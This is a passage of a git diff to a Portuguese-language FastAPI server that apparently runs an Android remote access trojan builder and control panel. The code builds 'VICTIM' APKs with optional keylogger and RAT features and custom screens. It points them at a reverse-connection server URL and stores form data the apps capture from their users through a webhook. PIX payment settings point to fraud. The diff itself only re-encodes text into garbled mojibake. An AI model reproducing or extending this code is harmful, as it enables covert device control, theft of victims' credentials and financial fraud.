     """
-    Download direto de arquivos gerados (EXE, APK, etc) com proteÃ§Ã£o contra Path Traversal
+    Download direto de arquivos gerados (EXE, APK, etc) com proteÃƒÂ§ÃƒÂ£o contra Path Traversal
     """
     safe_name = os.path.basename(filename)
     server_dir = os.path.dirname(os.path.abspath(__file__))
@@ -6651,7 +6843,7 @@ async def download_generic_file(filename: str):
     file_path = os.path.abspath(os.path.join(downloads_dir, safe_name))
     
     if not file_path.startswith(downloads_dir) or not os.path.exists(file_path):
-        raise HTTPException(status_code=404, detail="Arquivo nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Arquivo nÃƒÂ£o encontrado")
     
     media_type = "application/x-msdownload" if safe_name.endswith(".exe") else ("application/vnd.android.package-archive" if safe_name.endswith(".apk") else "application/octet-stream")
     return FileResponse(
@@ -6664,7 +6856,7 @@ async def download_generic_file(filename: str):
 @app.get("/api/build-status")
 async def get_latest_build_status(current_user: Operator = Depends(get_current_user)):
     """
-    Retorna status do Ãºltimo build
+    Retorna status do ÃƒÂºltimo build
     """
     import os
     server_dir = os.path.dirname(os.path.abspath(__file__))
@@ -6691,7 +6883,7 @@ async def get_user_layout(
     db: Session = Depends(get_db)
 ):
     """
-    Retorna as preferÃªncias de layout do usuÃ¡rio
+    Retorna as preferÃƒÂªncias de layout do usuÃƒÂ¡rio
     """
     prefs = db.query(UserLayoutPreferences).filter(
         UserLayoutPreferences.user_id == current_user.id
@@ -6712,7 +6904,7 @@ async def save_user_layout(
     db: Session = Depends(get_db)
 ):
     """
-    Salva as preferÃªncias de layout do usuÃ¡rio
+    Salva as preferÃƒÂªncias de layout do usuÃƒÂ¡rio
     """
     try:
         prefs = db.query(UserLayoutPreferences).filter(
@@ -6741,7 +6933,7 @@ async def reset_user_layout(
     db: Session = Depends(get_db)
 ):
     """
-    Reseta as preferÃªncias de layout do usuÃ¡rio para o padrÃ£o
+    Reseta as preferÃƒÂªncias de layout do usuÃƒÂ¡rio para o padrÃƒÂ£o
     """
     try:
         prefs = db.query(UserLayoutPreferences).filter(
@@ -6752,7 +6944,7 @@ async def reset_user_layout(
             db.delete(prefs)
             db.commit()
         
-        return {"status": "ok", "message": "Layout resetado para padrÃ£o"}
+        return {"status": "ok", "message": "Layout resetado para padrÃƒÂ£o"}
     except Exception as e:
         db.rollback()
         raise HTTPException(status_code=500, detail=f"Erro ao resetar layout: {str(e)}")
@@ -6767,7 +6959,7 @@ async def get_apk_templates(
     db: Session = Depends(get_db)
 ):
     """
-    Retorna templates de APK do usuÃ¡rio
+    Retorna templates de APK do usuÃƒÂ¡rio
     """
     templates = db.query(APKTemplate).filter(
         (APKTemplate.owner_id == current_user.id) | (APKTemplate.is_public == True)
@@ -6820,7 +7012,7 @@ async def create_apk_template(
         db.commit()
         db.refresh(template)
         
-        logger.info(f"ðŸ“¦ Template criado: {template.name} (ID: {template_id}) por {current_user.username}")
+        logger.info(f"Ã°Å¸â€œÂ¦ Template criado: {template.name} (ID: {template_id}) por {current_user.username}")
         
         return {
             "status": "ok",
@@ -6840,12 +7032,12 @@ async def get_apk_template(
     db: Session = Depends(get_db)
 ):
     """
-    Retorna template especÃ­fico com todos os dados
+    Retorna template especÃƒÂ­fico com todos os dados
     """
     template = db.query(APKTemplate).filter(APKTemplate.template_id == template_id).first()
     
     if not template:
-        raise HTTPException(status_code=404, detail="Template nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Template nÃƒÂ£o encontrado")
     
     # Verifica acesso
     if template.owner_id != current_user.id and not template.is_public:
@@ -6878,7 +7070,7 @@ async def update_apk_template(
     template = db.query(APKTemplate).filter(APKTemplate.template_id == template_id).first()
     
     if not template:
-        raise HTTPException(status_code=404, detail="Template nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Template nÃƒÂ£o encontrado")
     
     if template.owner_id != current_user.id:
         raise HTTPException(status_code=403, detail="Apenas o dono pode editar")
@@ -6920,7 +7112,7 @@ async def delete_apk_template(
     template = db.query(APKTemplate).filter(APKTemplate.template_id == template_id).first()
     
     if not template:
-        raise HTTPException(status_code=404, detail="Template nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Template nÃƒÂ£o encontrado")
     
     if template.owner_id != current_user.id and not current_user.is_admin:
         raise HTTPException(status_code=403, detail="Acesso negado")
@@ -6928,14 +7120,14 @@ async def delete_apk_template(
     db.delete(template)
     db.commit()
     
-    return {"status": "ok", "message": "Template excluÃ­do"}
+    return {"status": "ok", "message": "Template excluÃƒÂ­do"}
 
 # Fila de builds visuais
 visual_build_status = {}
 
 def build_visual_apk_background(build_id: str, template_data: dict, owner_id: int, db_session, icon_data: bytes = None, enable_anti_kill: bool = True, language: str = "pt"):
     """
-    ConstrÃ³i APK visual em background baseado no template
+    ConstrÃƒÂ³i APK visual em background baseado no template
     Usa o mesmo sistema de build do APK normal (Gradle)
     """
     try:
@@ -6956,7 +7148,7 @@ def build_visual_apk_background(build_id: str, template_data: dict, owner_id: in
 
         visual_build_status[build_id] = {"status": "building", "progress": 5, "message": "Iniciando..."}
         
-        # Cria diretÃ³rio temporÃ¡rio
+        # Cria diretÃƒÂ³rio temporÃƒÂ¡rio
         temp_dir = tempfile.mkdtemp()
         
         # Extrai dados do template
@@ -6965,14 +7157,14 @@ def build_visual_apk_background(build_id: str, template_data: dict, owner_id: in
         app_name = template_data.get("appName", "App")
         request_admin = template_data.get("requestAdmin", False)
         
-        visual_build_status[build_id] = {"status": "building", "progress": 10, "message": "Preparando configuraÃ§Ã£o..."}
+        visual_build_status[build_id] = {"status": "building", "progress": 10, "message": "Preparando configuraÃƒÂ§ÃƒÂ£o..."}
         
         # Caminhos do projeto
         server_dir = os.path.dirname(os.path.abspath(__file__))
         project_dir = os.path.join(server_dir, "..", "android-rat")
         
-        # 1. Salva configuraÃ§Ã£o de telas no assets do Android para o app ler
-        visual_build_status[build_id] = {"status": "building", "progress": 15, "message": "Salvando configuraÃ§Ã£o de telas..."}
+        # 1. Salva configuraÃƒÂ§ÃƒÂ£o de telas no assets do Android para o app ler
+        visual_build_status[build_id] = {"status": "building", "progress": 15, "message": "Salvando configuraÃƒÂ§ÃƒÂ£o de telas..."}
         
         assets_dir = os.path.join(project_dir, "app", "src", "main", "assets")
         os.makedirs(assets_dir, exist_ok=True)
@@ -6986,17 +7178,17 @@ def build_visual_apk_background(build_id: str, template_data: dict, owner_id: in
                 "build_id": build_id
             }, f, ensure_ascii=False, indent=2)
         
-        logger.info(f"[CONFIG] ConfiguraÃ§Ã£o visual salva em: {config_path}")
+        logger.info(f"[CONFIG] ConfiguraÃƒÂ§ÃƒÂ£o visual salva em: {config_path}")
         
-        visual_build_status[build_id] = {"status": "building", "progress": 25, "message": "Processando Ã­cone do aplicativo..."}
+        visual_build_status[build_id] = {"status": "building", "progress": 25, "message": "Processando ÃƒÂ­cone do aplicativo..."}
         
-        # 2. Processa Ã­cone do aplicativo (usa o fornecido ou gera fallback)
+        # 2. Processa ÃƒÂ­cone do aplicativo (usa o fornecido ou gera fallback)
         icon_path = os.path.join(temp_dir, "icon.png")
         
         if icon_data and len(icon_data) > 100:
             with open(icon_path, "wb") as f:
                 f.write(icon_data)
-            logger.info(f"[VISUAL-ICON] Usando Ã­cone personalizado recebido ({len(icon_data)} bytes)")
+            logger.info(f"[VISUAL-ICON] Usando ÃƒÂ­cone personalizado recebido ({len(icon_data)} bytes)")
         else:
             primary_color = theme.get("primaryColor", "#FF6600")
             try:
@@ -7008,14 +7200,14 @@ def build_visual_apk_background(build_id: str, template_data: dict, owner_id: in
                 draw.ellipse([margin, margin, size - margin, size - margin], fill='white')
                 img.save(icon_path, 'PNG')
             except Exception as e:
-                logger.warning(f"[WARN] Erro ao criar Ã­cone: {e}, usando Ã­cone padrÃ£o")
+                logger.warning(f"[WARN] Erro ao criar ÃƒÂ­cone: {e}, usando ÃƒÂ­cone padrÃƒÂ£o")
                 default_icon = os.path.join(project_dir, "app", "src", "main", "res", "mipmap-xxxhdpi", "ic_launcher.png")
                 if os.path.exists(default_icon):
                     shutil.copy(default_icon, icon_path)
                 else:
                     icon_path = None
         
-        visual_build_status[build_id] = {"status": "building", "progress": 30, "message": "Iniciando compilaÃ§Ã£o Gradle..."}
+        visual_build_status[build_id] = {"status": "building", "progress": 30, "message": "Iniciando compilaÃƒÂ§ÃƒÂ£o Gradle..."}
         stop_visual_ticker = create_smooth_progress_ticker(visual_build_status, build_id, 30, 88)
         
         # 3. Usa o APKBuilder existente para compilar
@@ -7024,14 +7216,14 @@ def build_visual_apk_background(build_id: str, template_data: dict, owner_id: in
         from apk_builder import APKBuilder
         builder = APKBuilder(project_dir, ngrok_url)
         
-        # Define caminho de saÃ­da
+        # Define caminho de saÃƒÂ­da
         downloads_dir = os.path.join(server_dir, "downloads")
         os.makedirs(downloads_dir, exist_ok=True)
         
         final_apk_name = f"{_slugify(app_name)}-visual.apk"
         final_apk = os.path.join(downloads_dir, final_apk_name)
         
-        # Compila usando o mÃ©todo build_visual_apk para embedar as telas desenhadas no visual_config.json!
+        # Compila usando o mÃƒÂ©todo build_visual_apk para embedar as telas desenhadas no visual_config.json!
         success = builder.build_visual_apk(
             app_name=app_name,
             icon_path=icon_path,
@@ -7044,7 +7236,7 @@ def build_visual_apk_background(build_id: str, template_data: dict, owner_id: in
         
         stop_visual_ticker()
         
-        # Remove arquivo de configuraÃ§Ã£o do assets apÃ³s build
+        # Remove arquivo de configuraÃƒÂ§ÃƒÂ£o do assets apÃƒÂ³s build
         try:
             os.remove(config_path)
         except:
@@ -7064,12 +7256,12 @@ def build_visual_apk_background(build_id: str, template_data: dict, owner_id: in
                     "build_id": build_id
                 }
             }
-            logger.info(f"[OK] APK Visual construÃ­do com Gradle: {app_name} (build_id: {build_id})")
+            logger.info(f"[OK] APK Visual construÃƒÂ­do com Gradle: {app_name} (build_id: {build_id})")
         else:
             visual_build_status[build_id] = {
                 "status": "error",
                 "progress": 0,
-                "message": "Erro na compilaÃ§Ã£o Gradle. Verifique os logs."
+                "message": "Erro na compilaÃƒÂ§ÃƒÂ£o Gradle. Verifique os logs."
             }
         
     except Exception as e:
@@ -7154,7 +7346,7 @@ async def get_visual_build_status(
     Retorna status do build visual
     """
     if build_id not in visual_build_status:
-        raise HTTPException(status_code=404, detail="Build nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Build nÃƒÂ£o encontrado")
     
     status = visual_build_status[build_id]
     
@@ -7162,7 +7354,7 @@ async def get_visual_build_status(
         return {
             "status": "success",
             "progress": 100,
-            "message": "APK construÃ­do com sucesso!",
+            "message": "APK construÃƒÂ­do com sucesso!",
             **status.get("result", {})
         }
     elif status["status"] == "error":
@@ -7180,7 +7372,7 @@ async def get_visual_build_status(
 
 # ==================== APK STUDIO - SISTEMA COMPLETO ====================
 
-# Armazenamento de projetos e dados dinÃ¢micos do APK Studio
+# Armazenamento de projetos e dados dinÃƒÂ¢micos do APK Studio
 apk_studio_data: Dict[str, Dict] = {}  # user_id -> {projects, captured_data, etc}
 
 @app.get("/api/apk-studio/projects")
@@ -7188,7 +7380,7 @@ async def get_studio_projects(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Lista todos os projetos do usuÃ¡rio no APK Studio"""
+    """Lista todos os projetos do usuÃƒÂ¡rio no APK Studio"""
     from models import APKStudioProject
     
     try:
@@ -7206,7 +7398,7 @@ async def get_studio_projects(
             "createdAt": p.created_at.isoformat() if p.created_at else None
         } for p in projects]
     except Exception as e:
-        # Se tabela nÃ£o existe, retorna lista vazia
+        # Se tabela nÃƒÂ£o existe, retorna lista vazia
         return []
 
 @app.post("/api/apk-studio/projects")
@@ -7256,7 +7448,7 @@ async def update_studio_project(
     ).first()
     
     if not project:
-        raise HTTPException(status_code=404, detail="Projeto nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Projeto nÃƒÂ£o encontrado")
     
     project.name = project_data.get("name", project.name)
     project.app_name = project_data.get("appName", project.app_name)
@@ -7284,14 +7476,14 @@ async def delete_studio_project(
     ).first()
     
     if not project:
-        raise HTTPException(status_code=404, detail="Projeto nÃ£o encontrado")
+        raise HTTPException(status_code=404, detail="Projeto nÃƒÂ£o encontrado")
     
     db.delete(project)
     db.commit()
     
-    return {"message": "Projeto excluÃ­do"}
+    return {"message": "Projeto excluÃƒÂ­do"}
 
-# ========== DADOS DINÃ‚MICOS DO APK STUDIO - BANCO DE DADOS PERSISTENTE ==========
+# ========== DADOS DINÃƒâ€šMICOS DO APK STUDIO - BANCO DE DADOS PERSISTENTE ==========
 
 @app.post("/api/apk-studio/webhook/{project_id}")
 async def studio_webhook(
@@ -7301,7 +7493,7 @@ async def studio_webhook(
 ):
     """
     Webhook para receber dados dos APKs gerados pelo APK Studio.
-    Os apps enviam dados aqui quando o usuÃ¡rio preenche formulÃ¡rios.
+    Os apps enviam dados aqui quando o usuÃƒÂ¡rio preenche formulÃƒÂ¡rios.
     SALVA NO BANCO DE DADOS - 100% PERSISTENTE!
     """
     from models import StudioCapturedData, StudioDataField, APKStudioProject
@@ -7327,7 +7519,7 @@ async def studio_webhook(
         )
         db.add(captured)
         
-        # Atualiza campos dinÃ¢micos detectados
+        # Atualiza campos dinÃƒÂ¢micos detectados
         for field_name in data.keys():
             if field_name.startswith("_"):  # Ignora campos internos
                 continue
@@ -7351,12 +7543,12 @@ async def studio_webhook(
         
         db.commit()
         
-        logger.info(f"[APK-STUDIO] âœ… Dados salvos no BD para projeto {project_id}: {len(data)} campos")
+        logger.info(f"[APK-STUDIO] Ã¢Å“â€¦ Dados salvos no BD para projeto {project_id}: {len(data)} campos")
         
         return {"status": "ok", "message": "Dados salvos com sucesso"}
     except Exception as e:
         db.rollback()
-        logger.error(f"[APK-STUDIO] âŒ Erro no webhook: {e}")
+        logger.error(f"[APK-STUDIO] Ã¢ÂÅ’ Erro no webhook: {e}")
         import traceback
         traceback.print_exc()
         return {"status": "error", "message": str(e)}
@@ -7389,8 +7581,8 @@ async def get_studio_data(
     db: Session = Depends(get_db)
 ):
     """
-    Retorna todos os dados recebidos de um projeto - COM PAGINAÃ‡ÃƒO
-    Dados vÃªm do BANCO DE DADOS - 100% persistente!
+    Retorna todos os dados recebidos de um projeto - COM PAGINAÃƒâ€¡ÃƒÆ’O
+    Dados vÃƒÂªm do BANCO DE DADOS - 100% persistente!
     """
     from models import StudioCapturedData, StudioDataField
     
@@ -7399,7 +7591,7 @@ async def get_studio_data(
         StudioCapturedData.project_id == project_id
     ).count()
     
-    # Busca dados com paginaÃ§Ã£o
+    # Busca dados com paginaÃƒÂ§ÃƒÂ£o
     offset = (page - 1) * limit
     captured_data = db.query(StudioCapturedData).filter(
         StudioCapturedData.project_id == project_id
@@ -7459,7 +7651,7 @@ async def clear_studio_data(
     
     db.commit()
     
-    return {"message": "Todos os dados foram excluÃ­dos do banco de dados"}
+    return {"message": "Todos os dados foram excluÃƒÂ­dos do banco de dados"}
 
 @app.get("/api/apk-studio/data/{project_id}/export")
 async def export_studio_data(
@@ -7525,7 +7717,7 @@ def build_studio_apk_background(build_id: str, project: dict, owner_id: int):
     import subprocess
     import shutil
     
-    # ðŸ”¥ IMPORTANTE: Salva o build no banco para atribuiÃ§Ã£o automÃ¡tica de dispositivos
+    # Ã°Å¸â€Â¥ IMPORTANTE: Salva o build no banco para atribuiÃƒÂ§ÃƒÂ£o automÃƒÂ¡tica de dispositivos
     try:
         from models import APKBuild
         from database import SessionLocal
@@ -7538,19 +7730,19 @@ def build_studio_apk_background(build_id: str, project: dict, owner_id: int):
             )
             db_session.add(apk_build)
             db_session.commit()
-            logger.info(f"[APK-STUDIO] Build {build_id} registrado no banco para usuÃ¡rio {owner_id}")
+            logger.info(f"[APK-STUDIO] Build {build_id} registrado no banco para usuÃƒÂ¡rio {owner_id}")
         finally:
             db_session.close()
     except Exception as e:
         logger.error(f"[APK-STUDIO] Erro ao registrar build no banco: {e}")
     
     try:
-        # ðŸ”¥ Detecta tipo de APK para mensagens
+        # Ã°Å¸â€Â¥ Detecta tipo de APK para mensagens
         build_target = project.get("buildTarget", "victim")
-        apk_type_label = "PAINEL ADMIN ðŸ‘‘" if build_target == "panel" else "VÃTIMA RAT ðŸ‘¤"
+        apk_type_label = "PAINEL ADMIN Ã°Å¸â€˜â€˜" if build_target == "panel" else "VÃƒÂTIMA RAT Ã°Å¸â€˜Â¤"
         studio_build_status[build_id] = {"status": "building", "progress": 5, "message": f"Iniciando build: {apk_type_label}"}
         
-        # 1. Cria diretÃ³rio temporÃ¡rio
+        # 1. Cria diretÃƒÂ³rio temporÃƒÂ¡rio
         project_dir = Path(__file__).parent.parent / "android-rat"
         temp_dir = Path(tempfile.mkdtemp(prefix=f"apk_studio_{build_id}_"))
         
@@ -7562,21 +7754,21 @@ def build_studio_apk_background(build_id: str, project: dict, owner_id: int):
         
         studio_build_status[build_id] = {"status": "building", "progress": 20, "message": "Configurando app..."}
         
-        # 3. Cria configuraÃ§Ã£o do app
-        # ObtÃ©m a serverUrl do projeto ou usa padrÃ£o
+        # 3. Cria configuraÃƒÂ§ÃƒÂ£o do app
+        # ObtÃƒÂ©m a serverUrl do projeto ou usa padrÃƒÂ£o
         server_url_config = project.get("serverUrl", "")
         if not server_url_config:
-            # Se nÃ£o tem serverUrl, usa a VPS atual ou localhost
+            # Se nÃƒÂ£o tem serverUrl, usa a VPS atual ou localhost
             server_url_config = os.environ.get("SERVER_URL", gangstar_env.public_base_url())
         
-        # Converte para formato HTTP se necessÃ¡rio (para APIs)
+        # Converte para formato HTTP se necessÃƒÂ¡rio (para APIs)
         http_server_url = server_url_config
         if http_server_url.startswith("wss://"):
             http_server_url = http_server_url.replace("wss://", "https://").replace("/ws", "")
         elif http_server_url.startswith("ws://"):
             http_server_url = http_server_url.replace("ws://", "http://").replace("/ws", "")
         
-        # ðŸ”¥ DETECTA SE Ã‰ BUILD DA VÃTIMA OU DO PAINEL
+        # Ã°Å¸â€Â¥ DETECTA SE Ãƒâ€° BUILD DA VÃƒÂTIMA OU DO PAINEL
         build_target = project.get("buildTarget", "victim")  # 'victim' ou 'panel'
         is_admin_panel = project.get("isAdminPanel", False) or build_target == "panel"
         
@@ -7596,29 +7788,29 @@ def build_studio_apk_background(build_id: str, project: dict, owner_id: int):
             "screens": actual_screens,  # Usa as telas corretas baseado no buildTarget
             "panelScreens": project.get("panelScreens", []) if not is_admin_panel else [],
             "theme": project.get("theme", {}),
-            "enableRat": project.get("enableRat", False) if not is_admin_panel else False,  # Painel NÃƒO Ã© RAT
+            "enableRat": project.get("enableRat", False) if not is_admin_panel else False,  # Painel NÃƒÆ’O ÃƒÂ© RAT
             "enablePayment": project.get("enablePayment", False),
             "enableKeylogger": project.get("enableKeylogger", False) if not is_admin_panel else False,
             "pixConfig": project.get("pixConfig"),
             "serverUrl": http_server_url,  # URL HTTP para APIs
             "webhookUrl": f"{http_server_url}/api/apk-studio/webhook/{project.get('id', build_id)}",
             
-            # ðŸ”¥ SEPARAÃ‡ÃƒO: Identifica qual tipo de APK
+            # Ã°Å¸â€Â¥ SEPARAÃƒâ€¡ÃƒÆ’O: Identifica qual tipo de APK
             "buildTarget": build_target,
             "isAdminPanel": is_admin_panel,
             "showInWebPanel": project.get("showInWebPanel", False) if not is_admin_panel else False,
             "source": "apk_studio_admin" if is_admin_panel else "apk_studio_victim"
         }
         
-        # Se for Painel Mobile RAT (Admin), inclui configuraÃ§Ãµes especiais
+        # Se for Painel Mobile RAT (Admin), inclui configuraÃƒÂ§ÃƒÂµes especiais
         if is_admin_panel or project.get("projectType") == "mobile_panel":
             mobile_config = project.get("mobilePanelConfig", {})
             
-            # ðŸ”¥ IMPORTANTE: Usa a serverUrl do projeto se nÃ£o tiver mobilePanelConfig
+            # Ã°Å¸â€Â¥ IMPORTANTE: Usa a serverUrl do projeto se nÃƒÂ£o tiver mobilePanelConfig
             # Isso garante que o APK do Admin sempre use a URL correta (VPS)
             panel_server_url = mobile_config.get("serverUrl", "") or project.get("serverUrl", "") or http_server_url
             
-            # Garante que a URL nÃ£o Ã© localhost (problema comum)
+            # Garante que a URL nÃƒÂ£o ÃƒÂ© localhost (problema comum)
             if "localhost" in panel_server_url or not panel_server_url:
                 panel_server_url = http_server_url  # Usa a URL do servidor atual
             
@@ -7640,9 +7832,9 @@ def build_studio_apk_background(build_id: str, project: dict, owner_id: int):
                 "brandingName": mobile_config.get("brandingName", "")
             }
             # Painel Mobile sempre tem RAT habilitado para funcionalidades
-            app_config["enableRat"] = False  # NÃƒO habilita RAT no APK admin (nÃ£o deve aparecer como dispositivo)
+            app_config["enableRat"] = False  # NÃƒÆ’O habilita RAT no APK admin (nÃƒÂ£o deve aparecer como dispositivo)
         
-        # 4. Salva configuraÃ§Ã£o no assets
+        # 4. Salva configuraÃƒÂ§ÃƒÂ£o no assets
         assets_dir = build_dir / "app" / "src" / "main" / "assets"
         assets_dir.mkdir(parents=True, exist_ok=True)
         
@@ -7657,9 +7849,9 @@ def build_studio_apk_background(build_id: str, project: dict, owner_id: int):
         patch_app_name(build_dir, app_name)
         patch_application_id(build_dir, package_name)
         
-        studio_build_status[build_id] = {"status": "building", "progress": 40, "message": "Configurando Ã­cone..."}
+        studio_build_status[build_id] = {"status": "building", "progress": 40, "message": "Configurando ÃƒÂ­cone..."}
         
-        # 6. Atualiza Ã­cone se fornecido
+        # 6. Atualiza ÃƒÂ­cone se fornecido
         if project.get("iconUrl"):
             icon_data = project["iconUrl"]
             if icon_data.startswith("data:image"):
@@ -7672,10 +7864,10 @@ def build_studio_apk_background(build_id: str, project: dict, owner_id: int):
                     if icon_path.parent.exists():
                         icon_path.write_bytes(icon_bytes)
         
-        studio_build_status[build_id] = {"status": "building", "progress": 45, "message": "Configurando conexÃ£o reversa..."}
+        studio_build_status[build_id] = {"status": "building", "progress": 45, "message": "Configurando conexÃƒÂ£o reversa..."}
         
-        # 6.5. ATUALIZA SERVER_URL PARA CONEXÃƒO REVERSA
-        # Isso Ã© CRÃTICO para o RAT funcionar - a vÃ­tima precisa conectar ao servidor correto
+        # 6.5. ATUALIZA SERVER_URL PARA CONEXÃƒÆ’O REVERSA
+        # Isso ÃƒÂ© CRÃƒÂTICO para o RAT funcionar - a vÃƒÂ­tima precisa conectar ao servidor correto
         server_url = project.get("serverUrl", "")
         if not server_url:
             server_url = gangstar_env.public_ws_url()
@@ -7691,8 +7883,8 @@ def build_studio_apk_background(build_id: str, project: dict, owner_id: int):
                     base_url = base_url.rstrip("/") + "/ws"
                 server_url = base_url
         
-        # ðŸ”¥ IMPORTANTE: Adiciona build_id na URL para atribuiÃ§Ã£o automÃ¡tica de usuÃ¡rio!
-        # Isso garante que quando o dispositivo conectar, ele seja atribuÃ­do ao usuÃ¡rio correto
+        # Ã°Å¸â€Â¥ IMPORTANTE: Adiciona build_id na URL para atribuiÃƒÂ§ÃƒÂ£o automÃƒÂ¡tica de usuÃƒÂ¡rio!
+        # Isso garante que quando o dispositivo conectar, ele seja atribuÃƒÂ­do ao usuÃƒÂ¡rio correto
         if "?" in server_url:
             server_url_with_build = f"{server_url}&build_id={build_id}"
         else:
@@ -7709,16 +7901,16 @@ def build_studio_apk_background(build_id: str, project: dict, owner_id: int):
                 content
             )
             cc_service_file.write_text(content, encoding="utf-8")
-            logger.info(f"[APK-STUDIO] âœ… SERVER_URL atualizado para: {server_url_with_build} (owner_id: {owner_id})")
+            logger.info(f"[APK-STUDIO] Ã¢Å“â€¦ SERVER_URL atualizado para: {server_url_with_build} (owner_id: {owner_id})")
         
         studio_build_status[build_id] = {"status": "building", "progress": 50, "message": "Compilando APK..."}
         
         # 7. Compila APK
         gradlew = build_dir / ("gradlew.bat" if os.name == "nt" else "gradlew")
         if not gradlew.exists():
-            raise Exception("Gradlew nÃ£o encontrado")
+            raise Exception("Gradlew nÃƒÂ£o encontrado")
         
-        # Torna executÃ¡vel no Linux
+        # Torna executÃƒÂ¡vel no Linux
         if os.name != "nt":
             os.chmod(gradlew, 0o755)
         
@@ -7741,22 +7933,22 @@ def build_studio_apk_background(build_id: str, project: dict, owner_id: int):
             apk_source = build_dir / "app" / "build" / "outputs" / "apk" / "release" / "app-release-unsigned.apk"
         
         if not apk_source.exists():
-            raise Exception("APK nÃ£o foi gerado")
+            raise Exception("APK nÃƒÂ£o foi gerado")
         
         downloads_dir = Path(__file__).parent / "downloads"
         downloads_dir.mkdir(exist_ok=True)
         
-        # ðŸ”¥ NOME DO APK DEFINIDO PELO USUÃRIO (obrigatÃ³rio)
+        # Ã°Å¸â€Â¥ NOME DO APK DEFINIDO PELO USUÃƒÂRIO (obrigatÃƒÂ³rio)
         user_apk_name = project.get("apkFileName", "").strip()
         if not user_apk_name or len(user_apk_name) < 3:
-            # Fallback se nÃ£o tiver nome definido
+            # Fallback se nÃƒÂ£o tiver nome definido
             safe_name = "".join(c if c.isalnum() or c in "-_" else "-" for c in project.get("appName", "app"))
             user_apk_name = safe_name.lower()
         
-        # Sanitiza o nome (apenas letras, nÃºmeros, hÃ­fens e underscores)
+        # Sanitiza o nome (apenas letras, nÃƒÂºmeros, hÃƒÂ­fens e underscores)
         safe_apk_name = "".join(c if c.isalnum() or c in "-_" else "-" for c in user_apk_name)
         
-        # ðŸ”¥ Inclui tipo (ADMIN ou VICTIM) no nome para fÃ¡cil identificaÃ§Ã£o
+        # Ã°Å¸â€Â¥ Inclui tipo (ADMIN ou VICTIM) no nome para fÃƒÂ¡cil identificaÃƒÂ§ÃƒÂ£o
         apk_type = "ADMIN" if is_admin_panel else "VICTIM"
         apk_filename = f"{_slugify(safe_apk_name)}-{apk_type}.apk"
         apk_dest = downloads_dir / apk_filename
@@ -7768,7 +7960,7 @@ def build_studio_apk_background(build_id: str, project: dict, owner_id: int):
         
         shutil.copy2(apk_source, apk_dest)
         
-        # 9. Limpa diretÃ³rio temporÃ¡rio
+        # 9. Limpa diretÃƒÂ³rio temporÃƒÂ¡rio
         try:
             shutil.rmtree(temp_dir)
         except:
@@ -7785,7 +7977,7 @@ def build_studio_apk_background(build_id: str, project: dict, owner_id: int):
             }
         }
         
-        logger.info(f"[APK-STUDIO] Build {build_id} concluÃ­do: {apk_filename}")
+        logger.info(f"[APK-STUDIO] Build {build_id} concluÃƒÂ­do: {apk_filename}")
         
     except Exception as e:
         logger.error(f"[APK-STUDIO] Erro no build {build_id}: {e}")
@@ -7828,7 +8020,7 @@ async def get_studio_build_status(
 ):
     """Retorna status do build"""
     if build_id not in studio_build_status:
-        return {"status": "not_found", "message": "Build nÃ£o encontrado"}
+        return {"status": "not_found", "message": "Build nÃƒÂ£o encontrado"}
     
     return studio_build_status[build_id]
 
@@ -7838,11 +8030,11 @@ async def download_studio_apk(
     token: Optional[str] = Query(None),
     db: Session = Depends(get_db)
 ):
-    """Download do APK gerado - Suporta autenticaÃ§Ã£o por header ou query parameter ?token="""
+    """Download do APK gerado - Suporta autenticaÃƒÂ§ÃƒÂ£o por header ou query parameter ?token="""
     downloads_dir = Path(__file__).parent / "downloads"
     apk_path = downloads_dir / filename
     
-    # Smart Fallback: Se o nome exato nÃ£o for encontrado, faz busca flexÃ­vel no diretÃ³rio
+    # Smart Fallback: Se o nome exato nÃƒÂ£o for encontrado, faz busca flexÃƒÂ­vel no diretÃƒÂ³rio
     if not apk_path.exists():
         matched_file = None
         if downloads_dir.exists():
@@ -7869,7 +8061,7 @@ async def download_studio_apk(
             if alt_path.exists():
                 apk_path = alt_path
             else:
-                raise HTTPException(status_code=404, detail="APK nÃ£o encontrado no servidor")
+                raise HTTPException(status_code=404, detail="APK nÃƒÂ£o encontrado no servidor")
     
     return FileResponse(
         apk_path,
@@ -7878,14 +8070,14 @@ async def download_studio_apk(
     )
 
 
-# ========== CONFIGURAÃ‡Ã•ES PIX DO USUÃRIO ==========
+# ========== CONFIGURAÃƒâ€¡Ãƒâ€¢ES PIX DO USUÃƒÂRIO ==========
 
 @app.get("/api/apk-studio/pix-configs")
 async def get_pix_configs(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Lista configuraÃ§Ãµes PIX do usuÃ¡rio"""
+    """Lista configuraÃƒÂ§ÃƒÂµes PIX do usuÃƒÂ¡rio"""
     from models import UserPixConfig
     
     try:
@@ -7911,7 +8103,7 @@ async def create_pix_config(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Cria nova configuraÃ§Ã£o PIX"""
+    """Cria nova configuraÃƒÂ§ÃƒÂ£o PIX"""
     from models import UserPixConfig
     import uuid
     
@@ -7926,7 +8118,7 @@ async def create_pix_config(
         is_default=config_data.get("isDefault", False)
     )
     
-    # Se marcado como padrÃ£o, desmarca outros
+    # Se marcado como padrÃƒÂ£o, desmarca outros
     if config.is_default:
         db.query(UserPixConfig).filter(
             UserPixConfig.owner_id == current_user.id
@@ -7935,7 +8127,7 @@ async def create_pix_config(
     db.add(config)
     db.commit()
     
-    return {"id": config.config_id, "message": "ConfiguraÃ§Ã£o criada"}
+    return {"id": config.config_id, "message": "ConfiguraÃƒÂ§ÃƒÂ£o criada"}
 
 @app.delete("/api/apk-studio/pix-configs/{config_id}")
 async def delete_pix_config(
@@ -7943,7 +8135,7 @@ async def delete_pix_config(
     current_user: Operator = Depends(get_current_user),
     db: Session = Depends(get_db)
 ):
-    """Exclui configuraÃ§Ã£o PIX"""
+    """Exclui configuraÃƒÂ§ÃƒÂ£o PIX"""
     from models import UserPixConfig
     
     config = db.query(UserPixConfig).filter(
@@ -7955,21 +8147,21 @@ async def delete_pix_config(
         db.delete(config)
         db.commit()
     
-    return {"message": "ConfiguraÃ§Ã£o excluÃ­da"}
+    return {"message": "ConfiguraÃƒÂ§ÃƒÂ£o excluÃƒÂ­da"}
 
 
